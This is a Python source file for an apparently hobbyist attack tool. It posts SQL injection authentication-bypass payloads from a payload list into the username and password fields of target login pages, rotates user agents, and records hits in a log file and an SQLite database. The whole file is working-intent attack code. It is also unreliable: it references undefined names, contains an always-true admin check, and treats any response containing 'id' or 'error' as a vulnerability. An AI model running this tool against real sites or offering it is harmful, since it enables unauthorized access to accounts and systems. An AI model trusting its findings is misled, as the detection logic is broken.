import os
import sys
import asyncio
import re
import requests
from colorama import Fore,init,Style
from datetime import datetime
# import sock
import sqlite3
# from database import create_database_for_Captures
import os
import sys

lib_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'scripts'))
sys.path.append(lib_path)
import sys
import os

from headers import *



from headers import *

import logging

############################################################################
attack_type = "authentication bypass SQL injection"
#############################################################################

"""
Functions for performing substring SQL injection attacks on a target website.

Dependencies:
- os
- sys
- asyncio
- re
- requests
- colorama (Fore, init, Style)
- datetime
- sqlite3
- headers (from headers import *)
- logging

Note:
- The SQL injection payloads are sourced from https://github.com/payloadbox/sql-injection-payload-list.
- The headers for HTTP requests are inspired by https://stackoverflow.com/questions/70017732/how-to-change-the-ip-address-in-the-url.
- The 'headers' module is required for user-agent settings (imported from headers import *).
- Logging is configured to store information in the 'SQLJ.log' file.

Usage Example:
```python
from sql_injection_exploit import substring_sql_inj

urls_to_attack = ["http://example.com/login", "http://testsite.net/login"]
for url in urls_to_attack:
    asyncio.run(substring_sql_inj(url))
"""





####################################33
pattern = r"\berror\b"
htmlpattern = r"\bid\b"
capturesAUTHBYPASS = []
########################################
#* Setting a couple of user agents
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}

###############################################


#
logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)


async def substring_sql_inj(urls):
    """This is the authentication bypass sql injection block. it occurs when the input datas are not validated and attacker can inject its own code to the database and bypass the authentication"""
    try:
        """This is the main block of our exploit program which sending the payloads. """
        global pattern,htmlpattern  
        done = False 
        filename = "mysqlblindsubstring.txt"
        current_directory = os.path.dirname(os.path.abspath(__file__)) 
        file_path = os.path.join(current_directory, filename) 

        with open(file_path, "r") as file: 
            payload = file.read()
            rows = payload.split("\n") 
            sorted_rows = sorted(rows) 
            sorted_payload = "\n".join(sorted_rows) #* 
            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) 
            requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False) 
            # assert req.status_code == 200
            if req.status_code == 200: 
                ask = input(f"[{datetime.now()}]{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}[INFO]**Looks like the host is up: {Fore.RESET}{Fore.YELLOW}{urls} {Fore.RESET}{Fore.GREEN} \nDo you want to send the payload above to the website?** ")
                logging.info(f"Could get a 200 request for the target: {urls} in the time : {datetime.now()}")

                if ask.lower() == "y":
                    for line in sorted_payload.split("\n"): 
                        #############################################################33
                        params = { 
                            "username": line,
                            "password": line
                        }
                        ##############################################################################
                        # print(line)
                        await Prepare_the_headers()
                        for headerR in headers:
                            ack = requests.post(url=urls, data=params,verify=False,headers={"User-Agent": header}) 
                            print(f"[{datetime.now()}]|**[INFO]Current payload: | {Fore.RESET}{Style.BRIGHT}{line} |with status code|:{Fore.RESET}{Fore.BLUE}{ack.status_code}\n|Headers:|{header}**") 
                            # print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
                            await asyncio.sleep(5) 
                            if "error" in ack.text: 
                                print(f"[{datetime.now()}]{Fore.RESET}{Fore.LIGHTWHITE_EX}|**[INFO]Vulnerability found in the response code:|ack.text\n|Headers:|{header}**")
                                
                            vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) 
                            htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                            if vuln: 
                                print(f"[{datetime.now()}]**[INFO]{Fore.RESET}{Fore.LIGHTYELLOW_EX}  | **Vulnerability found in the response code: |{Fore.RESET}{Fore.CYAN} {ack.text} | vulnerability count:| {len(vuln)}|Attack:||authentication bypass SQL injection|\n|Headers:**|{header}**")
                                logging.info(f"[INFO] vulnerability may exists in the target url:{urls} attack type:{attack_type} in the time:{datetime.now()}")
                                await asyncio.sleep(3) 
                            
                            if htmlVULN:
                                print(f"[{datetime.now()}] {Fore.RESET}{Fore.LIGHTMAGENTA_EX} |**Vulnerability found:|{Fore.RESET}{Fore.LIGHTBLUE_EX}{ack.text}|with the count of|:{Fore.RESET}{Fore.LIGHTMAGENTA_EX}{len(htmlVULN)}\n|Headers:**|{Fore.RESET}{Fore.LIGHTYELLOW_EX}{header}")
                                logging.info(f"[INFO]Could find a vulnerability in the website html form:{urls} time:{datetime.now()} note:the vulnerability might not be that much significant.")
                                await asyncio.sleep(3)
                            
                            word = "id" in req.text                             
                            errword = "error" in req.text
                            if word:
                                print(f"[{datetime.now()}]**[INFO]{Fore.RESET}{Fore.LIGHTYELLOW_EX}  |** Vulnerability found in the response code: |{Fore.RESET}{Fore.CYAN} {ack.text} | vulnerability count:| {len(vuln)}|Attack:||authentication bypass SQL injection|\n|Headers:**|{header}**")
                                logging.info(f"[INFO] vulnerability may exists in the target url(id parameters):{urls} attack type:{attack_type} in the time:{datetime.now()}")
                                await asyncio.sleep(3)
                            
                            if errword:
                                print(f"[{datetime.now()}]",Fore.RED + "|**Vulnerability found in the Error based attack Status|:","|" ,errword if errword is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection","\n|Headers:**|",header)
                                logging.info(f"[INFO] vulnerability may exists in the target url:{urls} attack type:{attack_type} in the time:{datetime.now()}")
                                await asyncio.sleep(3)
                                
                            
                                
                        if req.status_code == 302:                                             
                            print(f"[{datetime.now()}]",Fore.GREEN+"**[INFO]Could found injectable area on the website with the keyword:","|",line,"|"+"|Attack:|"+"authentication bypass SQL injection","\n|Headers:**|",header)
                            logging.info(f"Could bypass the authentication in the target:{urls} in the time:{datetime.now()}")
                            done = True
                        
                        if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                            print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]**Could connect to the website but did found injectable area on the website.","|Attack:|","authentication bypass SQL injection","\n|Headers:**|",headers)
                            logging.info(f"Could not find any injectable significant area in the target:{urls} in the time:{datetime.now()}")
                            
                else:
                    print(f"[{datetime.now()}]",Fore.RED+"Host is down","|Attack:|","authentication bypass SQL injection","\n|Headers:|",header)
                    logging.error(f"Could not connect to the target:{urls} in the time:{datetime.now()}")
            
        # await create_database_for_Captures()
        conn = sqlite3.connect("SQLJresult.db")
        cur = conn.cursor()

        sql = "INSERT INTO Datas (Data,attacktype) VALUES (?,?)"
        # values = [attack_type,(ack.text,), (str(headers),), (str(ack.status_code),), (str(vuln,),), (str(htmlVULN),), (str(errword),), (str(word),), (str(req.status_code),), (str(ack.text),)]
        values = [(attack_type, str(ack.text)), (attack_type, str(headers)), (attack_type, str(ack.status_code)), (attack_type, str(vuln)), (attack_type, str(htmlVULN)), (attack_type, str(errword)), (attack_type, str(word)), (attack_type, str(req.status_code)), (attack_type, str(ack.text))]

        cur.executemany(sql, values)

        conn.commit()
        conn.close()
        #############################################################################################################
    except Exception as e:
        print(f"{datetime.now()}",Fore.RED+"Error:",e,"|Attack:|",attack_type)
        
    except KeyboardInterrupt:
        pass
        
    except ConnectionAbortedError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection aborted error:",e,"|Attack:|",attack_type)
        
    except ConnectionError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection error:",e,"|Attack:|",attack_type)
        
    except ConnectionRefusedError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection refused error:",e,"|Attack:|",attack_type)
        
    except ConnectionResetError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection reset error:",e,"|Attack:|",attack_type)
        
    except UnicodeEncodeError:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] UnicodeEncodeError:",e,"|Attack:|",attack_type)
    
    except AssertionError:
        pass
        
    except MemoryError:
        """We handle the memory and RAM error in here to catch this exception """
        import psutil
        # Get the system memory information
        memory = psutil.virtual_memory()

        # Calculate the threshold for 80% memory usage
        threshold = memory.total * 0.9

        # Check if the used memory is greater than the threshold
        Err =  memory.used <= threshold
        while not Err:
            memory = psutil.virtual_memory()
            Err = memory.used <= threshold
            print(Fore.RED+"[INFO]Please Release you RAM space to continue the application"+"|Attack:|",attack_type)
            await asyncio.sleep(5)
# asyncio.run(Memory_handling())
        
    finally:
        pass
     
        
        
     

async def auth_main(urL):
    await auth_SQL_inj(urL)

# asyncio.run(substring_sql_inj("http://testfire.net/login.jsp"))
